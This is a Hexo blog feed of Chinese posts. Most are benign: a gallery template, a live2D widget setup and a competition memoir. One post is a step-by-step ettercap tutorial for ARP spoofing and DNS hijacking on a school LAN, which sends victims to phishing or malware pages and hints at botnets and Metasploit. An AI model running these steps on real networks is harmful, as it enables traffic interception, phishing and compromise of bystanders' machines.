punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(site.data</span> <span class="token attr-name">&amp;&amp;</span> <span class="token attr-name">site.data.galleries)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>        &lt;% var galleries = site.data.galleries; %>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gallery-wrapper row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            &lt;% for (var i = 0, len = galleries.length; i &lt; len; i++) { %>            &lt;% var gallery = galleries[i]; %>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s6 m4 l4 xl3 gallery-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./&lt;%- gallery.name %<span class="token punctuation">></span><span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gallery-item<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gallery-cover-box<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url">url(http://图片地址.com/&lt;%- gallery.cover%>)</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gallery-name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%-</span> <span class="token attr-name">gallery.name</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170909.png" alt=""></p><p>同目录下新建<code>gallery.ejs</code>，添加以下代码：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/css/gallery.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/libs/fancybox/jquery.fancybox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/libs/justifiedGallery/justifiedGallery.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;%- partial('_partial/post-cover') %>&lt;%let galleries = [];if (site.data &amp;&amp; site.data.galleries) {    galleries = site.data.galleries;}var pageTitle = page.title;function getCurrentGallery(galleries, pageTitle) {    for (let i = 0; i &lt; galleries.length; i++) {        if (galleries[i]['name'] == pageTitle) {            return galleries[i];        }    }}var currentGallery = getCurrentGallery(galleries, pageTitle)var photos = currentGallery.photos;let imageStr = ''for (var i = 0, len = photos.length; i &lt; len; i++) {    var photo = photos[i];    imageStr += "&lt;a href=\"http://图片地址.com/" + photo + "\"" +            "     class=\"photo-item\" rel=\"example_group\"" +            "     data-fancybox=\"images\">" +            "      &lt;img src=\"http://图片地址.com/" + photo + "\"" +            "       alt=" + photo + ">\n" +            "    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>"}%><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>photo-wrapper<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>waterfall<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mygallery<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%-</span> <span class="token attr-name">imageStr</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/libs/fancybox/fancybox.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/libs/justifiedGallery/justifiedGallery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"a[rel=example_group]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fancybox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#mygallery"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">justifiedGallery</span><span class="token punctuation">(</span><span class="token punctuation">{</span>margins<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> rowHeight<span class="token punctuation">:</span> <span class="token number">150</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170911.png" alt=""></p><p>以上代码实现的功能呢，就是读取相册配置文件并把相册目录和相册列表都渲染成HTML，用<code>&lt;% %&gt;</code>包起来的代码是<code>ejs</code>语法，</p><h4 id="3、制作相册配置文件"><a href="#3、制作相册配置文件" class="headerlink" title="3、制作相册配置文件"></a>3、制作相册配置文件</h4><pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span>  <span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"2017"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"2017/IMG_20171109_124516.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"2017年记录"</span><span class="token punctuation">,</span>    <span class="token property">"photos"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token string">"2017/IMG_20170924_110224.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2017/IMG_20170924_113412.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2017/IMG_20171109_124516.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2017/IMG_20171125_125304.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2017/IMG_20171126_181605.jpg"</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"2018"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"2018/IMG_20181124_125818.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"2018年记录"</span><span class="token punctuation">,</span>    <span class="token property">"photos"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token string">"2018/IMG_20180204_113055.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2018/IMG_20180204_113302.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2018/IMG_20180204_113442.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2018/IMG_20180208_083336.jpg"</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"2019"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"2019/IMG_20190331_165713_1.jpg"</span><span class="token punctuation">,</span>    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"2019年记录"</span><span class="token punctuation">,</span>    <span class="token property">"photos"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token string">"2019/IMG_20190118_200104.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2019/IMG_20190118_200120.jpg"</span><span class="token punctuation">,</span>      <span class="token string">"2019/IMG_20190118_200456.jpg"</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170910.png" alt=""></p><p>就是一个包含多个相册的列表JSON，每个相册有以下字段，<code>name</code>是相册标题，<code>cover</code>是封面图片，从相册里随便选一个就行，<code>description</code>是相册介绍，<code>photos</code>是图片列表。图片较少的话手动复制进去就行，如果你图片较多的话推荐使用脚本之类的东西自动生成，我是使用了上面博客里的js文件生成的。我这里使用了七牛对象存储做为图床，需要在代码里加上七牛的地址才能正常显示。</p><p>配置文件建好了之后还没完，只剩最后一个步骤了，在<code>galleries</code>下建立对应的相册名称目录和文件，比如我这三个相册需要建 2017 2018 2019三个目录，</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170904.png" alt=""></p><p>然后下面再分别新建<code>index.md</code>文件，文件内容为:</p><hr><p>title: 2017</p><h2 id="layout-“gallery”"><a href="#layout-“gallery”" class="headerlink" title="layout: “gallery”"></a>layout: “gallery”</h2><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170905.png" alt=""></p><p>建好相应目录和文件之后，如果你的图片路径也没有错的话，相册目录和列表就都会渲染出来了，如下所示：</p><p>依次输入命令：<code>hexo clean</code> &amp; <code>hexo g</code> &amp; <code>hexo s -g</code> </p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170916.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170915.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo添加live2D看板娘动画</title>
      <link href="/posts/3379.html"/>
      <url>/posts/3379.html</url>
      
        <content type="html"><![CDATA[<h3 id="Live2D模型官方配置文档"><a href="#Live2D模型官方配置文档" class="headerlink" title="Live2D模型官方配置文档"></a>Live2D模型官方配置文档</h3><p>官网地址配置：<a href="https://www.npmjs.com/package/hexo-helper-live2d" target="_blank" rel="noopener">https://www.npmjs.com/package/hexo-helper-live2d</a></p><h3 id="食用步骤"><a href="#食用步骤" class="headerlink" title="食用步骤"></a>食用步骤</h3><p>首先检查博客根目录（<del>注意不是主题根目录</del>）<code>package.json</code>文件里是否有”<code>hexo-helper-live2d":"^3.1.1"</code>，依赖。</p><p>有的话使用命令卸载：<code>npm uninstall hexo-helper-live2d</code>（<del>没有忽略</del>）</p><p><strong>安装命令</strong>：<code>npm install --save hexo-helper-live2d</code></p><p><em>提示</em>：命令都是在博客根目录执行，并非主题目录。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224057.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224058.png" alt=""></p><p>安装完依赖之后，可以在package.json里看到model</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224051.png" alt=""></p><p>此时进入node_moduels目录下，可以看到live2d-widget文件夹，里面全都是动画配置；</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224054.png" alt=""></p><h3 id="动画下载直通车：https-github-com-xiazeyu-live2d-widget-models-git"><a href="#动画下载直通车：https-github-com-xiazeyu-live2d-widget-models-git" class="headerlink" title="动画下载直通车：https://github.com/xiazeyu/live2d-widget-models.git"></a>动画下载直通车：<a href="https://github.com/xiazeyu/live2d-widget-models.git" target="_blank" rel="noopener">https://github.com/xiazeyu/live2d-widget-models.git</a></h3><p>下载好之后将packages里的所有动画模板拷贝在node_modules目录里(也可以筛选自己喜欢的)</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224053.png" alt=""></p><p>找到博客根目录下的站点配置文件<code>_config.yml</code>打开；将以下代码复制到里面，进行配置以及启用live2D模板；</p><pre class=" language-bash"><code class="language-bash">live2d:  enable: <span class="token boolean">true</span>  pluginModelPath: assets/  model:    use: live2d-widget-model-epsilon2_1  <span class="token comment" spellcheck="true">#模板目录，在node_modules里</span>  display:    position: right    width: 150     height: 300  mobile:    show: <span class="token boolean">false</span>  <span class="token comment" spellcheck="true">#是否在手机进行显示</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224055.png" alt=""></p><h3 id="开始部署并渲染；"><a href="#开始部署并渲染；" class="headerlink" title="开始部署并渲染；"></a>开始部署并渲染；</h3><p>依次执行<code>hexo clean</code> &amp; <code>hexo g</code> &amp; <code>hexo s</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224052.png" alt=""></p><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200110224056.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网下ARP欺骗以及DNS劫持</title>
      <link href="/posts/32390.html"/>
      <url>/posts/32390.html</url>
      
        <content type="html"><![CDATA[<p><strong>DNS又称为域名劫持</strong><br>定义：<br>域名劫持是互联网攻击的一种方式，通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的地址从而实现用户无法访问目标网站的目的。</p><p>原理：<br>局域网劫持, 攻击者通过伪装成网关, 劫持受害者的网络请求, 将网络请求拦截到指定的服务器；这就是DNS欺骗的基本原理。DNS欺骗其实并不是真的“黑掉”了对方的网站，而是冒名顶替、招摇撞骗罢了。</p><p><strong>局域网、交换机 、AP Dns劫持姿势！</strong><br>对学校机房进行一次简单的劫持（危害，可以通过钓鱼网页 把网吧电脑全部集成肉鸡，进行DDOS攻击等等…让学校网吧所有机子集体瘫痪、卡屏）<br>目的为了让学校重视网络安全！（已经通知网管并协助修复）</p><ul><li><p>攻击前的配置  </p><p>再欺骗之前呢，为了能让受害者访问到我们设置的钓鱼网页or挂马网页；</p></li></ul><p>1、我们需要开启Apache Web服务环境，<br>命令：<code>/etc/init.d/apache2 start</code><br>如果没有开启，受害者的主机不能访问任何网页！</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200109210755.jpg" alt=""></p><p>2、接着再终端输入：/etc/ettercap/etter.dns（也可以根据路径找到文件，双击打开修改）<br>在文档里修改<a href="http://www.linux.org后面的数据即可，指定欺骗的域名和跳转的IP地址，可以结合钓鱼网站，自动化浏览器攻击等技术进行入侵。" target="_blank" rel="noopener">www.linux.org后面的数据即可，指定欺骗的域名和跳转的IP地址，可以结合钓鱼网站，自动化浏览器攻击等技术进行入侵。</a></p><p>3、最后在根目录/var/www/index.html修改自己劫持响应的网页<br>现在我们的配置文件以及Web服务已经修改并配置完成；</p><p><em>先喝口百事阔乐压压惊<del>~</del></em></p><ul><li>接下来开始实施ARP欺骗以及DNS攻击</li></ul><p><strong>GUI界面的攻击</strong><br>0x1<br>首先打开ettercap这个软件<br>终端输入命令ettercap -G进入ettercap的GUI界面，选择Unified sniffing(Ctrl H)，然后在弹出的选项中选择eth0（如果你有无线网卡可以选择wlan0）这个一般不用修改,视情况而定,选择自己正确挂载的网卡即可。</p><p>0x2<br>在Hosts下选择Scan for hosts(Ctrl+S)扫描局域网所有在线IP，然后选择Hosts list(Ctrl+H)列出局域网下所有IP<br>接着选择判断默认网关,选中并且右键加入Add to Target1;被攻击者选中IP右键加入Add to Target2;</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200109210753.jpg" alt=""></p><p>0x3<br>在Mitm中选择Arp poisoning(攻击方式为ARP)，<br>在MIMT Attack:ARP Poisoning窗口下,勾选Sniff remote connections这个选项并确定。</p><p>0x4<br>在Plugins菜单栏下打开Manage the plugins(Ctrl+P)选择攻击插件，将DNS劫持插件dns_spoof双击选中；出现*号表示已经选中。</p><p>0x5<br>在菜单栏Start下选择Stare sniffing(Shift+Ctrl+W)发起攻击</p><p>Tip:<br>如果没有成功, 可以打开 ettercap的配置文件 =&gt; vim /etc/ettercap/etter.conf</p><ul><li>以上是GUI界面的操作，接下来演示通过终端命令如何劫持</li></ul><p>打开终端,运行ettercap输入以下命令:<br>ettercap -T -q -i eth0 -P dns_spoof -M arp<br>命令注释:<br>-M MAC监听<br>-T 脱机监听<br>-P 过滤筛选器<br>-i 使用此网络接口<br>eth0 本机网卡<br>ARP拦截局域网所有的DNS映射到本机的etter.dns中</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200109210754.jpg" alt=""></p><p>窗口滚动,说明局域网内的鱼上钩了。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200109211059.jpg" alt=""></p><p>只要打开网页,DNS都会映射到攻击机的IP上,淫荡的任你玩弄!!!<br>(进而窃听植入病毒DNS投毒钓鱼劫持会话 配合msf完成一系列的攻击)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云南唯康杯，含泪夺省一</title>
      <link href="/posts/10989.html"/>
      <url>/posts/10989.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><strong>2020年云南省电子商务技能大赛”唯康杯“1月5号在红河州正式进行比赛</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111000023.png" alt=""></p><p>   其实这次比赛省一等奖，是我想都想不到的名次；为了准备这次的比赛我们“<strong>猪会飞</strong>队”停课近一个多月。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111000027.jpg" alt=""></p><p>   此次获奖首先要感谢我们的指导老师：赵老师和宋老师以及其老班和他提意见的老师……</p><p>   其实我当时参加这个技能大赛也是一个意外，本打算不参加的因为觉得自己很菜；没有实力，，到现在我都不知道当初哪里来的热血，像打了鸡血一样天天练习电子商务（美工）说实话，当时我Ps都基本上忘记了怎么使用，因为假期都在研究别的网络安全技术，。，因为不服输（文化课可以输，但是我感兴趣的东西我怎么忍心让别人夺走呢？？？）所以那几天一直都在某站学习Ps美工技巧。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111000022.jpg" alt=""></p><p>   有一次我在宿舍用笔记本电脑练习比赛的美工，都会被值周的老师看见了而且拍照上报教师群（在这里感谢老班的理解与包容）；在这里我想说不一定玩电脑就是打游戏，因为我还有梦想，。希望老师不要再阻止我追寻梦想的道路，我学习成绩确实差劲，但是我想说“术业有专攻，如是而已”</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111000025.jpg" alt=""></p><p>   毕竟是第一次参加这样的比赛，快比赛的前几天都感觉一直很郁闷，每天坚持练习到很晚直至比赛结束，怕辜负了大家的期望，，好在努力就有结果，！6号比赛结束返校那一天真的在大巴上自闭了一天，因为成绩晚了一天出来；那一天都是闷闷不乐的。7号早上出成绩了，令我感到意外的是我们居然夺得省一等奖；当时比赛想都不敢想的名次，我都不相信自己有这样的实力;不鸣则已 一鸣惊人。</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111000026.jpg" alt=""></p><p>   这一路我们都在打击中不断地进步，完善自身。通过参加此次比赛我认识了很多大佬，也懂得了团队意识的重要性，；人生机会只有一次，没有把握好的话。后悔也没用。</p><p>   感觉通过比赛自己成长了很多！！！</p><p>来年继续加油，冲冲冲！！！   </p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111000028.jpg" alt=""></p><p>在追梦的道路上，渐行渐远~~</p><p><strong><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111000024.jpg" alt=""></strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 中职电子商务技能大赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 唯康杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hacker技术学的再好，却无法侵入你的心！</title>
      <link href="/posts/27878.html"/>
      <url>/posts/27878.html</url>
      
